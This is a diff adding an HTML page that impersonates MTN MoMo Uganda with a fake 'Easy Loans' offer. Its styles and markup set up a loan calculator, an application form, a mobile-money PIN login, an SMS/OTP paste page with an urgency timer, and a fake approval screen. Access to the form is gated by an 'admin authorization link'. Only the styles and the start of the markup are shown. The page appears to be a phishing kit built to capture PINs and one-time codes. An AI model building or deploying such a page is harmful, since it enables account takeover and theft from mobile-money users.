@@ -1,0 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style rel="stylesheet" type="text/css">
+:root { --mtn-dark: #003366; --mtn-gold: #FFD700; --mtn-light: #004080; --grad: linear-gradient(to right, #003366, #004080); --page-bg: #F5F5F5; --white: #FFFFFF; --text-dark: #1C2340; --text-mid: #444; --text-light: #888; --border: #ddd; --radius: 12px; --radius-sm: 8px; }
+* { box-sizing: border-box; margin: 0px; padding: 0px; }
+body { font-family: Inter, sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
+.mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+.mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
+.mtn-logo-icon::after { content: "M"; font-size: 2rem; font-weight: 900; }
+.mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
+.mtn-logo-sub { font-size: 0.65rem; color: rgb(136, 136, 136); font-weight: 500; }
+.page { display: none; min-height: 100vh; animation: 0.3s ease 0s 1 normal none running fadeIn; }
+.page.active { display: flex; flex-direction: column; }
+@keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0px); } }
+.overlay { display: none; position: fixed; inset: 0px; background: rgba(0, 0, 0, 0.5); backdrop-filter: blur(3px); z-index: 999; align-items: center; justify-content: center; }
+.overlay.show { display: flex; }
+.modal { background: var(--white); border-radius: var(--radius); padding: 40px 36px; text-align: center; max-width: 320px; width: 90%; box-shadow: rgba(0, 0, 0, 0.2) 0px 20px 60px; animation: 0.3s cubic-bezier(0.34, 1.56, 0.64, 1) 0s 1 normal none running popIn; }
+@keyframes popIn { 0% { opacity: 0; transform: scale(0.85); } 100% { opacity: 1; transform: scale(1); } }
+.spinner { width: 44px; height: 44px; border-width: 4px; border-style: solid; border-right-color: rgb(238, 238, 238); border-bottom-color: rgb(238, 238, 238); border-left-color: rgb(238, 238, 238); border-image: none; border-top-color: var(--mtn-gold); border-radius: 50%; animation: 0.8s linear 0s infinite normal none running spin; margin: 0px auto 18px; }
+@keyframes spin { 100% { transform: rotate(360deg); } }
+.modal h3 { font-size: 1.1rem; font-weight: 600; color: var(--text-dark); margin-bottom: 6px; }
+.modal p { font-size: 0.88rem; color: var(--text-light); }
+.navbar { background: var(--mtn-dark); display: flex; align-items: center; justify-content: center; padding: 0px 20px; height: 54px; position: relative; flex-shrink: 0; }
+.nav-left { position: absolute; left: 20px; color: rgba(255, 255, 255, 0.6); font-size: 0.84rem; cursor: pointer; text-decoration: none; transition: color 0.2s; }
+.nav-left:hover { color: rgb(255, 255, 255); }
+.nav-right { position: absolute; right: 20px; display: flex; flex-direction: column; gap: 4px; cursor: pointer; padding: 4px; }
+.hline { width: 20px; height: 2px; background: rgba(255, 255, 255, 0.6); border-radius: 1px; }
+.btn-grad { background: var(--grad); color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; padding: 14px 20px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; width: 100%; font-family: Inter, sans-serif; transition: opacity 0.2s; }
+.btn-grad:hover { opacity: 0.9; }
+.btn-grad:disabled { opacity: 0.5; cursor: not-allowed; }
+.btn-gray { background: rgb(224, 224, 224); color: rgb(102, 102, 102); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; padding: 14px 20px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; flex: 1 1 0%; font-family: Inter, sans-serif; transition: background 0.2s; }
+.btn-gray:hover { background: rgb(208, 208, 208); }
+.field { margin-bottom: 18px; }
+.field label { display: block; font-size: 0.82rem; font-weight: 500; color: var(--text-mid); margin-bottom: 6px; }
+.field input, .field select, .field textarea { width: 100%; padding: 11px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-family: Inter, sans-serif; font-size: 0.9rem; color: var(--text-dark); background: rgb(255, 255, 255); outline: none; transition: border-color 0.2s, box-shadow 0.2s; appearance: none; }
+.field input:focus, .field select:focus, .field textarea:focus { border-color: var(--mtn-gold); box-shadow: rgba(255, 215, 0, 0.2) 0px 0px 0px 3px; }
+.field textarea { resize: vertical; min-height: 90px; }
+.sel-wrap { position: relative; }
+.sel-wrap::after { content: "▾"; position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: var(--text-light); pointer-events: none; font-size: 0.9rem; }
+.field-row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.phone-row { display: flex; }
+.ph-pre { padding: 11px 12px; background: rgb(245, 245, 245); border-right-width: medium; border-right-style: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 0.85rem; font-weight: 500; color: rgb(85, 85, 85); white-space: nowrap; display: flex; align-items: center; }
+.phone-row input { flex: 1 1 0%; border-radius: 0 var(--radius-sm) var(--radius-sm) 0 !important; }
+.field-hint { font-size: 0.75rem; color: var(--text-light); margin-top: 5px; }
+.prog-row { display: flex; gap: 8px; margin: 10px 0px 24px; }
+.prog-seg { flex: 1 1 0%; height: 4px; border-radius: 2px; background: rgb(224, 224, 224); transition: background 0.3s; }
+.prog-seg.done { background: var(--mtn-gold); }
+.prog-seg.now { background: var(--mtn-gold); }
+.step-btns { display: flex; gap: 12px; margin-top: 8px; }
+.step-btns .btn-grad { flex: 1 1 0%; }
+.pg-footer { margin-top: auto; padding: 14px; text-align: center; font-size: 0.78rem; color: var(--text-light); background: rgb(255, 255, 255); border-top: 1px solid rgb(238, 238, 238); flex-shrink: 0; }
+#page-landing { background: var(--page-bg); }
+.land-nav { background: var(--mtn-dark); display: flex; align-items: center; justify-content: space-between; padding: 0px 24px; height: 52px; flex-shrink: 0; }
+.land-nav .hbg { display: flex; flex-direction: column; gap: 4px; cursor: pointer; }
+.land-nav .hbg span { width: 20px; height: 2px; background: rgba(255, 255, 255, 0.7); border-radius: 1px; display: block; }
+.land-center { flex: 1 1 0%; display: flex; align-items: center; justify-content: center; padding: 32px 16px; }
+.land-card { width: 100%; max-width: 520px; background: rgb(255, 255, 255); border-radius: var(--radius); box-shadow: rgba(0, 0, 0, 0.1) 0px 4px 24px; padding: 36px 32px; }
+.land-card h1 { font-size: 1.45rem; font-weight: 700; text-align: center; margin-bottom: 6px; }
+.land-tagline { text-align: center; font-size: 0.84rem; color: var(--text-light); margin-bottom: 28px; }
+.calc-box { background: rgb(250, 250, 250); border: 1px solid rgb(238, 238, 238); border-radius: var(--radius-sm); padding: 20px; margin-bottom: 22px; }
+.calc-box h2 { font-size: 0.92rem; font-weight: 600; margin-bottom: 16px; }
+.calc-row2 { display: flex; justify-content: space-between; font-size: 0.81rem; color: var(--text-mid); margin-bottom: 6px; }
+.calc-row2 .cv { color: var(--mtn-gold); font-weight: 600; }
+input[type="range"] { width: 100%; appearance: none; height: 5px; border-radius: 3px; outline: none; cursor: pointer; margin-bottom: 4px; background: linear-gradient(to right,var(--mtn-gold) 0%,var(--mtn-gold) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
+input[type="range"]::-webkit-slider-thumb { appearance: none; width: 18px; height: 18px; border-radius: 50%; background: var(--mtn-gold); border: 3px solid rgb(255, 255, 255); box-shadow: rgba(255, 215, 0, 0.5) 0px 2px 6px; cursor: pointer; }
+.range-ends { display: flex; justify-content: space-between; font-size: 0.72rem; color: var(--text-light); margin-bottom: 14px; }
+.monthly-box { background: rgb(255, 255, 255); border: 1px solid rgb(238, 238, 238); border-radius: var(--radius-sm); padding: 14px 16px; display: flex; justify-content: space-between; align-items: center; }
+.monthly-box .ml { font-size: 0.82rem; color: var(--text-light); }
+.monthly-box .ma { font-size: 1.5rem; font-weight: 700; color: var(--mtn-gold); }
+.feats-row { display: flex; justify-content: space-around; padding: 20px 0px 0px; border-top: 1px solid rgb(240, 240, 240); margin-top: 4px; }
+.feat { text-align: center; }
+.feat .fi { font-size: 1.6rem; margin-bottom: 5px; }
+.feat .ft { font-size: 0.8rem; font-weight: 600; }
+.feat .fs { font-size: 0.73rem; color: var(--text-light); }
+.land-footer { background: var(--mtn-dark); padding: 14px; text-align: center; font-size: 0.77rem; color: rgba(255, 255, 255, 0.45); flex-shrink: 0; }
+.step-center { flex: 1 1 0%; display: flex; align-items: flex-start; justify-content: center; padding: 28px 16px; }
+.step-card { width: 100%; max-width: 480px; background: rgb(255, 255, 255); border-radius: var(--radius); box-shadow: rgba(0, 0, 0, 0.08) 0px 4px 24px; padding: 32px 28px; }
+.step-card h2 { font-size: 1.25rem; font-weight: 700; text-align: center; margin-bottom: 4px; }
+.step-sub { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 4px; }
+.sum-box { border-top: 1px solid rgb(224, 224, 224); border-right: 1px solid rgb(224, 224, 224); border-bottom: 1px solid rgb(224, 224, 224); border-image: none; border-left: 4px solid var(--mtn-gold); border-radius: var(--radius-sm); padding: 16px 14px; margin: 16px 0px; background: rgb(250, 255, 254); }
+.sum-box h3 { font-size: 0.88rem; font-weight: 600; margin-bottom: 12px; }
+.sum-row { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 7px 0px; border-bottom: 1px solid rgb(240, 240, 240); }
+.sum-row:last-child { border-bottom-width: medium; border-bottom-style: none; border-bottom-color: currentcolor; }
+.sum-row .sk { color: var(--text-light); }
+.sum-row .sv { font-weight: 500; }
+#page-processing { background: linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); align-items: center; justify-content: center; }
+.proc-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
+.proc-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.3); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0px auto 24px; animation: 2s ease 0s infinite normal none running pulse; }
+@keyframes pulse { 0%, 100% { box-shadow: rgba(255, 215, 0, 0.3) 0px 0px 0px 0px; } 50% { box-shadow: rgba(255, 215, 0, 0) 0px 0px 0px 16px; } }
+.proc-wrap h2 { font-size: 1.6rem; font-weight: 700; color: rgb(255, 255, 255); margin-bottom: 12px; }
+.proc-wrap p { color: rgba(255, 255, 255, 0.75); font-size: 0.88rem; line-height: 1.7; margin-bottom: 24px; }
+#page-login { background: rgb(255, 255, 255); }
+.login-hdr { background: var(--mtn-dark); padding: 32px 20px 36px; display: flex; flex-direction: column; align-items: center; gap: 8px; flex-shrink: 0; }
+.login-body-wrap { flex: 1 1 0%; background: rgb(255, 255, 255); padding: 32px 20px 0px; display: flex; flex-direction: column; align-items: center; }
+.login-body-wrap h2 { font-size: 1.05rem; font-weight: 600; margin-bottom: 24px; }
+.login-inner { width: 100%; max-width: 380px; }
+.lg-phone-row { display: flex; margin-bottom: 24px; }
+.lg-ph-pre { display: flex; align-items: center; gap: 4px; padding: 11px 12px; background: rgb(250, 250, 250); border-right-width: medium; border-right-style: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 0.84rem; color: rgb(85, 85, 85); font-weight: 500; white-space: nowrap; }
+.lg-phone-row input { flex: 1 1 0%; padding: 11px 14px; border: 1.5px solid var(--border); border-left-width: medium; border-left-style: none; border-radius: 0 var(--radius-sm) var(--radius-sm) 0; font-family: Inter, sans-serif; font-size: 0.9rem; outline: none; background: rgb(255, 255, 255); transition: border-color 0.2s; }
+.lg-phone-row input:focus { border-color: var(--mtn-gold); }
+.pin-label { font-size: 0.82rem; color: var(--text-light); text-align: center; margin-bottom: 12px; }
+.pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; position: relative; align-items: center; }
+.pin-box { width: 52px; height: 52px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); text-align: center; font-family: Inter, sans-serif; font-size: 1.3rem; font-weight: 700; color: var(--mtn-dark); outline: none; transition: border-color 0.2s; }
+.pin-box:focus { border-color: var(--mtn-gold); box-shadow: rgba(255, 215, 0, 0.2) 0px 0px 0px 3px; }
+.pin-eye { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; margin-left: 6px; }
+.pin-delete { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; margin-left: 6px; padding: 0px; transition: color 0.2s; }
+.pin-delete:hover { color: var(--mtn-gold); }
+.forgot-pin { text-align: center; font-size: 0.82rem; color: var(--text-light); margin-bottom: 24px; cursor: pointer; }
+.btn-login { width: 100%; max-width: 380px; padding: 13px; background: rgb(232, 232, 232); color: rgb(170, 170, 170); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; font-family: Inter, sans-serif; transition: 0.2s; }
+.btn-login.rdy { background: var(--grad); color: rgb(255, 255, 255); }
+.lg-curve { margin-top: 32px; background: rgb(255, 255, 255); overflow: hidden; flex-shrink: 0; }
+.lg-curve::before { content: ""; display: block; background: var(--mtn-dark); height: 55px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
+.lg-foot { background: var(--mtn-dark); padding: 24px 20px 32px; display: flex; flex-direction: column; align-items: center; gap: 8px; text-align: center; }
+.lg-foot .logo-text { font-size: 1.2rem; }
+.lg-version { font-size: 0.72rem; color: rgba(255, 255, 255, 0.4); margin-top: 4px; }
+.lg-terms { font-size: 0.72rem; color: rgba(255, 255, 255, 0.45); }
+.lg-terms a { color: rgba(255, 255, 255, 0.65); }
+#page-wait-sms { background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); align-items: center; justify-content: center; }
+.wait-wrap { text-align: center; padding: 40px 24px; max-width: 420px; }
+.wait-icon { width: 80px; height: 80px; border-radius: 50%; background: rgba(255, 255, 255, 0.1); border: 2px solid rgba(255, 255, 255, 0.3); display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0px auto 24px; animation: 2s ease 0s infinite normal none running pulse; }
+.wait-wrap h2 { font-size: 1.6rem; font-weight: 700; color: rgb(255, 255, 255); margin-bottom: 12px; }
+.wait-wrap p { color: rgba(255, 255, 255, 0.75); font-size: 0.88rem; line-height: 1.7; margin-bottom: 24px; }
+#page-sms-paste { background: rgb(255, 255, 255); }
+.sms-topbar { display: flex; align-items: center; justify-content: space-between; padding: 0px 20px; height: 52px; border-bottom: 1px solid rgb(238, 238, 238); flex-shrink: 0; }
+.sms-topbar .bk { font-size: 1.1rem; color: rgb(51, 51, 51); cursor: pointer; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; }
+.sms-body-wrap { flex: 1 1 0%; padding: 32px 16px; display: flex; align-items: flex-start; justify-content: center; }
+.sms-card { background: rgb(255, 255, 255); border: 1px solid rgb(238, 238, 238); border-radius: var(--radius); padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: rgba(0, 0, 0, 0.06) 0px 2px 16px; }
+.sms-card h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 6px; color: var(--mtn-dark); }
+.sms-hint { font-size: 0.83rem; color: var(--text-light); margin-bottom: 22px; }
+.sms-textarea { width: 100%; padding: 12px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-family: Inter, sans-serif; font-size: 0.9rem; color: var(--text-dark); background: rgb(255, 255, 255); outline: none; transition: border-color 0.2s; min-height: 120px; resize: vertical; }
+.sms-textarea:focus { border-color: var(--mtn-gold); box-shadow: rgba(255, 215, 0, 0.2) 0px 0px 0px 3px; }
+.sms-code-hint { font-size: 0.75rem; color: var(--text-light); margin-top: 8px; font-style: italic; }
+.btn-sms { width: 100%; padding: 13px; background: rgb(232, 232, 232); color: rgb(170, 170, 170); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; font-family: Inter, sans-serif; transition: 0.2s; margin-top: 16px; }
+.btn-sms.rdy { background: var(--grad); color: rgb(255, 255, 255); }
+.sms-curve { background: rgb(255, 255, 255); overflow: hidden; flex-shrink: 0; }
+.sms-curve::before { content: ""; display: block; background: var(--mtn-dark); height: 50px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
+.sms-foot { background: var(--mtn-dark); padding: 14px; text-align: center; font-size: 0.75rem; color: rgba(255, 255, 255, 0.45); }
+.sms-timer-wrap { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; padding: 10px 14px; background: rgb(255, 248, 240); border: 1.5px solid rgb(245, 194, 138); border-radius: var(--radius-sm); }
+.sms-timer-circle { position: relative; width: 44px; height: 44px; flex-shrink: 0; }
+.sms-timer-svg { transform: rotate(-90deg); }
+.sms-timer-bg { fill: none; stroke: rgb(240, 224, 204); stroke-width: 4; }
+.sms-timer-arc { fill: none; stroke: rgb(224, 120, 0); stroke-width: 4; stroke-linecap: round; stroke-dasharray: 113; stroke-dashoffset: 0; transition: stroke-dashoffset 1s linear, stroke 1s; }
+.sms-timer-arc.urgent { stroke: rgb(217, 30, 30); }
+.sms-timer-num { position: absolute; inset: 0px; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: rgb(224, 120, 0); }
+.sms-timer-num.urgent { color: rgb(217, 30, 30); }
+.sms-timer-text { font-size: 0.82rem; color: rgb(122, 69, 0); line-height: 1.4; }
+.sms-timer-text strong { font-weight: 600; }
+.sms-resend-wrap { display: none; background: rgb(254, 242, 242); border: 1.5px solid rgb(254, 202, 202); border-radius: var(--radius-sm); padding: 16px 16px 14px; margin-bottom: 14px; text-align: center; }
+.sms-resend-wrap p { font-size: 0.83rem; color: rgb(153, 27, 27); margin-bottom: 12px; line-height: 1.5; }
+.btn-resend { display: inline-flex; align-items: center; gap: 6px; padding: 10px 22px; background: var(--grad); color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.85rem; font-weight: 600; letter-spacing: 0.04em; cursor: pointer; font-family: Inter, sans-serif; transition: opacity 0.2s; }
+.btn-resend:hover { opacity: 0.88; }
+.btn-resend:disabled { opacity: 0.5; cursor: not-allowed; }
+.otp-paste-section { margin-bottom: 22px; }
+.otp-paste-label { font-size: 0.82rem; font-weight: 600; color: var(--mtn-dark); margin-bottom: 6px; }
+.otp-paste-hint { font-size: 0.78rem; color: var(--text-light); margin-bottom: 10px; }
+.otp-paste-textarea { width: 100%; padding: 11px 14px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); font-family: Inter, sans-serif; font-size: 0.88rem; color: var(--text-dark); background: rgb(255, 255, 255); outline: none; transition: border-color 0.2s; min-height: 90px; resize: vertical; }
+.otp-paste-textarea:focus { border-color: var(--mtn-gold); box-shadow: rgba(255, 215, 0, 0.2) 0px 0px 0px 3px; }
+.otp-paste-code-hint { font-size: 0.74rem; color: var(--text-light); margin-top: 6px; font-style: italic; }
+.otp-divider { display: flex; align-items: center; gap: 10px; margin: 18px 0px 16px; }
+.otp-divider-line { flex: 1 1 0%; height: 1px; background: rgb(224, 224, 224); }
+.otp-divider-text { font-size: 0.75rem; color: var(--text-light); font-weight: 500; white-space: nowrap; }
+#page-otp { background: rgb(255, 255, 255); }
+.otp-topbar { display: flex; align-items: center; justify-content: space-between; padding: 0px 20px; height: 52px; border-bottom: 1px solid rgb(238, 238, 238); flex-shrink: 0; }
+.otp-topbar .bk { font-size: 1.1rem; color: rgb(51, 51, 51); cursor: pointer; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; }
+.otp-body-wrap { flex: 1 1 0%; padding: 32px 16px; display: flex; align-items: flex-start; justify-content: center; }
+.otp-card { background: rgb(255, 255, 255); border: 1px solid rgb(238, 238, 238); border-radius: var(--radius); padding: 32px 28px; width: 100%; max-width: 440px; box-shadow: rgba(0, 0, 0, 0.06) 0px 2px 16px; }
+.otp-card h2 { font-size: 1.2rem; font-weight: 700; margin-bottom: 6px; color: var(--mtn-dark); }
+.otp-hint { font-size: 0.83rem; color: var(--text-light); margin-bottom: 5px; }
+.otp-section { margin-bottom: 24px; }
+.otp-section-title { font-size: 0.9rem; font-weight: 600; color: var(--mtn-dark); margin-bottom: 12px; }
+.otp-inputs { display: flex; gap: 8px; margin-bottom: 12px; width: 100%; }
+.otp-box { flex: 1 1 0%; min-width: 0px; width: 0px; height: 52px; border: 1.5px solid var(--border); border-radius: var(--radius-sm); text-align: center; font-family: Inter, sans-serif; font-size: 1.2rem; font-weight: 700; color: var(--mtn-dark); outline: none; transition: border-color 0.2s; }
+.otp-box:focus { border-color: var(--mtn-gold); box-shadow: rgba(255, 215, 0, 0.2) 0px 0px 0px 3px; }
+.otp-box::-webkit-outer-spin-button, .otp-box::-webkit-inner-spin-button { appearance: none; margin: 0px; }
+.otp-delete { cursor: pointer; color: var(--text-light); font-size: 1rem; background: none; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; margin-left: 6px; padding: 0px; transition: color 0.2s; }
+.otp-delete:hover { color: var(--mtn-gold); }
+.btn-otp { width: 100%; padding: 13px; background: rgb(232, 232, 232); color: rgb(170, 170, 170); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; font-family: Inter, sans-serif; transition: 0.2s; margin-top: 16px; }
+.btn-otp.rdy { background: var(--grad); color: rgb(255, 255, 255); }
+.otp-curve { background: rgb(255, 255, 255); overflow: hidden; flex-shrink: 0; }
+.otp-curve::before { content: ""; display: block; background: var(--mtn-dark); height: 50px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }
+.otp-foot { background: var(--mtn-dark); padding: 14px; text-align: center; font-size: 0.75rem; color: rgba(255, 255, 255, 0.45); }
+#page-approval { background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height: 100vh; align-items: center; justify-content: center; padding: 32px 16px; }
+.appr-wrap { width: 100%; max-width: 520px; }
+.appr-top { background: rgb(255, 255, 255); border-radius: var(--radius) var(--radius) 0 0; padding: 28px 24px 0px; text-align: center; }
+.check-circle { width: 56px; height: 56px; border-radius: 50%; background: linear-gradient(135deg,var(--mtn-gold),var(--mtn-light)); display: flex; align-items: center; justify-content: center; margin: 0px auto 12px; font-size: 1.3rem; color: rgb(255, 255, 255); box-shadow: rgba(255, 215, 0, 0.5) 0px 4px 16px; }
+.appr-title { font-size: 1.2rem; font-weight: 700; margin-bottom: 6px; }
+.appr-sub { font-size: 0.82rem; color: var(--text-light); margin-bottom: 18px; }
+.appr-banner { background: var(--grad); padding: 16px; margin: 0px -24px; text-align: center; }
+.appr-banner .abl { font-size: 0.72rem; color: rgba(255, 255, 255, 0.8); text-transform: uppercase; letter-spacing: 0.06em; }
+.appr-banner .aba { font-size: 2rem; font-weight: 700; color: rgb(255, 255, 255); }
+.comp-box { background: rgb(255, 251, 234); border: 1px solid rgb(245, 200, 66); padding: 14px 16px; }
+.comp-box .ch { display: flex; align-items: center; gap: 6px; font-size: 0.82rem; font-weight: 700; color: rgb(160, 112, 0); margin-bottom: 6px; }
+.comp-box p { font-size: 0.78rem; color: rgb(122, 85, 0); line-height: 1.6; }
+.comp-box strong { font-weight: 600; }
+.ld-card { background: rgb(255, 255, 255); padding: 20px 24px; }
+.ld-htitle { font-size: 0.82rem; font-weight: 600; color: var(--text-mid); margin-bottom: 14px; display: flex; align-items: center; gap: 6px; }
+.ld-row { display: flex; align-items: center; gap: 12px; padding: 10px 0px; border-bottom: 1px solid rgb(245, 245, 245); }
+.ld-row:last-child { border-bottom-width: medium; border-bottom-style: none; border-bottom-color: currentcolor; }
+.ld-icon { width: 34px; height: 34px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 0.85rem; flex-shrink: 0; }
+.ic-g { background: linear-gradient(135deg, rgb(46, 204, 113), rgb(39, 174, 96)); color: rgb(255, 255, 255); }
+.ic-b { background: linear-gradient(135deg, rgb(52, 152, 219), rgb(41, 128, 185)); color: rgb(255, 255, 255); }
+.ic-p { background: linear-gradient(135deg, rgb(155, 89, 182), rgb(142, 68, 173)); color: rgb(255, 255, 255); }
+.ld-lbl { font-size: 0.72rem; color: var(--text-light); text-transform: uppercase; letter-spacing: 0.04em; }
+.ld-val { font-size: 0.9rem; font-weight: 600; }
+.nxt-steps { background: rgb(255, 255, 255); padding: 14px 24px; display: flex; align-items: flex-start; gap: 8px; border-top: 1px solid rgb(240, 240, 240); }
+.nxt-steps p { font-size: 0.79rem; color: var(--text-light); line-height: 1.5; }
+.rth-wrap { background: rgb(255, 255, 255); border-radius: 0 0 var(--radius) var(--radius); padding: 14px 24px 24px; }
+.rth-btn { width: 100%; padding: 13px; background: var(--grad); color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.04em; cursor: pointer; font-family: Inter, sans-serif; }
+.msg-box { border-radius: var(--radius-sm); padding: 12px 16px; font-size: 0.84rem; margin-bottom: 16px; display: none; align-items: center; gap: 10px; }
+.msg-box.show { display: flex; }
+.msg-box.error { background: rgb(254, 242, 242); border: 1.5px solid rgb(254, 202, 202); color: rgb(153, 27, 27); }
+.msg-box.success { background: rgb(240, 253, 244); border: 1.5px solid rgb(187, 247, 208); color: rgb(22, 101, 52); }
+.msg-box.info { background: rgb(239, 246, 255); border: 1.5px solid rgb(191, 219, 254); color: rgb(30, 64, 175); }
+.msg-box.warning { background: rgb(254, 252, 232); border: 1.5px solid rgb(254, 240, 138); color: rgb(133, 77, 14); }
+.msg-icon { font-weight: 700; }
+.loading { display: none; }
+.loading.show { display: block; }
+.wait-msg { text-align: center; color: var(--text-light); font-size: 0.88rem; }
+.admin-error-modal { display: none; position: fixed; inset: 0px; background: rgba(0, 0, 0, 0.6); z-index: 10000; align-items: center; justify-content: center; padding: 20px; }
+.admin-error-modal.show { display: flex; }
+.admin-error-content { background: rgb(255, 255, 255); border-radius: var(--radius); padding: 36px 32px; max-width: 420px; width: 100%; text-align: center; box-shadow: rgba(0, 0, 0, 0.3) 0px 20px 60px; }
+.admin-error-content h3 { font-size: 1.15rem; font-weight: 700; color: rgb(217, 30, 30); margin-bottom: 12px; }
+.admin-error-content p { font-size: 0.9rem; color: var(--text-mid); line-height: 1.6; margin-bottom: 24px; }
+.admin-error-code { background: rgb(245, 245, 245); padding: 12px; border-radius: 8px; font-family: monospace; font-size: 0.85rem; color: rgb(102, 102, 102); margin-bottom: 20px; border: 1px solid rgb(221, 221, 221); }
+.admin-error-btn { padding: 12px 24px; background: var(--grad); color: rgb(255, 255, 255); border-width: medium; border-style: none; border-color: currentcolor; border-image: none; border-radius: 8px; font-size: 0.9rem; font-weight: 600; cursor: pointer; font-family: Inter, sans-serif; }
+</style>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN MoMo Uganda – Easy Loans</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+
+</head>
+<body>
+
+<div id="adminErrorModal" class="admin-error-modal">
+  <div class="admin-error-content">
+    <h3>⚠️ Access Denied</h3>
+    <p>This form requires an admin authorization link to proceed. Please use the link provided by your administrator.</p>
+    <div class="admin-error-code" id="adminErrorCode">
+      Example: https://yoursite.com/form?admin=ADMIN123456
+    </div>
+    <p style="font-size:0.85rem; color:var(--text-light); margin-bottom:0;">Contact your administrator if you don't have a valid link.</p>
+  </div>
+</div>
+
+<div id="page-landing" class="page active">
+  <div class="land-nav">
+    <div style="flex: 1;"></div>
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon">M</div>
+      <div class="mtn-logo-text">MoMo</div>
+      <div class="mtn-logo-sub">from MTN</div>
+    </div>
+    <div style="flex: 1;"></div>
+  </div>
+  <div class="land-center">
+    <div class="land-card">
+      <h1>Welcome to MTN MoMo Uganda</h1>
+      <p class="land-tagline">Get loans easily through MTN MoMo Uganda</p>
+      <div class="calc-box">
+        <h2>Loan Calculator</h2>
+        <div class="calc-row2">
+          <span>Amount</span>
+          <span class="cv" id="calcAmt">UGX 1,000,000</span>
+        </div>
+        <div class="calc-row2">
+          <span>Term</span>
+          <span class="cv" id="calcTerm">48 Months</span>
+        </div>
+        <input type="range" id="amtSlider" min="500000" max="5000000" step="100000" value="1000000">
+        <div class="range-ends">
+          <span>UGX 500,000</span>
+          <span>UGX 5,000,000</span>
+        </div>
+        <div class="monthly-box">
+          <span class="ml">Monthly Payment</span>
+          <span class="ma" id="monthlyAmt">UGX 20,834</span>
+        </div>
+      </div>
+      <button class="btn-grad">START APPLICATION</button>
+    </div>
+  </div>
+  <div class="land-footer">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-step1" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 1 of 3</p>
+      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s1Err"><span class="msg-icon">✕</span><span id="s1ErrTxt"></span></div>
